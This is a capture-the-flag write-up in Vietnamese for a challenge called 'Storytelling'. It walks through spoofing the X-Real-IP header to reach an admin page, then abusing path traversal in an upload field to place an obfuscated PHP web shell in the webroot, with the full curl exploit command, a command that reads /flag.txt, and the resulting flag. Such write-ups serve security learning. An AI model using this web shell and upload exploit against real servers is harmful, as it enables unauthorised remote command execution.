# Storytelling

Mục tiêu: Chiếm quyền điều khiển server (RCE) và đọc file `/flag.txt`.

### Bước 1: Reconnaissance & Access Bypass

Đầu tiên, chúng ta tiếp cận trang quản trị `/admin.php`.

* **Hiện tượng**: Trang web trả về lỗi 403 Forbidden hoặc chặn truy cập.
* **Phân tích**: Server thường kiểm tra IP người dùng để chỉ cho phép admin truy cập từ mạng nội bộ (localhost).
* **Hành động**: Thêm header `X-Real-IP` để giả mạo IP thành `127.0.0.1`. **Request:**

```http
GET /admin.php HTTP/1.1
Host: 20.24.214.139:13005
X-Real-IP: 127.0.0.1
...
```

**Kết quả**: Truy cập thành công panel upload Story.

### Bước 2: Vulnerability Analysis (Phân tích lỗi)

Chúng ta thấy chức năng upload file ảnh kèm các trường thông tin: `time`, `event`, `caption`.

* **Thử nghiệm**: Upload file `shell.php` bình thường.
* **Kết quả**: File vào thư mục `/images/shell.php` nhưng không chạy được code PHP (có thể do cấu hình server chặn thực thi PHP trong thư mục `/images/`).
* **Ý tưởng**: Dùng lỗi **Path Traversal** trong tên file hoặc tham số đường dẫn để đưa file shell ra khỏi thư mục `/images/`, về thư mục gốc (webroot). Server có vẻ ghép tên file theo công thức: `path = "images/" + time + "_" + event + ...` Nếu ta chỉnh `time` thành `../`, đường dẫn sẽ thành: `images/../_rootshell.php` -> Tương đương `/var/www/html/_rootshell.php` (Webroot).

### Bước 3: Crafting Payload (Tạo Shell)

Tạo file `safe_shell.php` đơn giản để tránh filter.

```php
<?php
$a = 'sys';
$b = 'tem';
$cmd = $a . $b; // Ghép thành 'system'
$cmd($_GET['c']); // Chạy lệnh từ tham số 'c'
?>
```

### Bước 4: Exploitation (Khai thác)

Dùng `curl` để gửi request với đầy đủ các tham số đã tính toán. **Lệnh Exploit:**

```bash
curl -X POST http://20.24.214.139:13005/admin.php \
  -H "X-Real-IP: 127.0.0.1" \
  -H "Cookie: PHPSESSID=exploit_session" \
  -F "time=../" \
  -F "event=rootshell" \
  -F "caption=pwn" \
  -F "image=@safe_shell.php;filename=shell.php;type=application/x-php"
```

**Giải thích:**

* `time=../`: Nhảy về thư mục gốc.
* `event=rootshell`: Định danh file shell.
* `image=@safe_shell.php`: Upload nội dung file shell.

### Bước 5: Post-Exploitation (Lấy Flag)

Sau bước 4, file shell đã nằm tại `http://20.24.214.139:13005/_rootshell.php`. Truy cập URL sau để đọc flag: `http://20.24.214.139:13005/_rootshell.php?c=cat /flag.txt` **Flag thu được:**

```
F-SEC{f8212ccc61bd825cb1be9dcba28e113f}
```
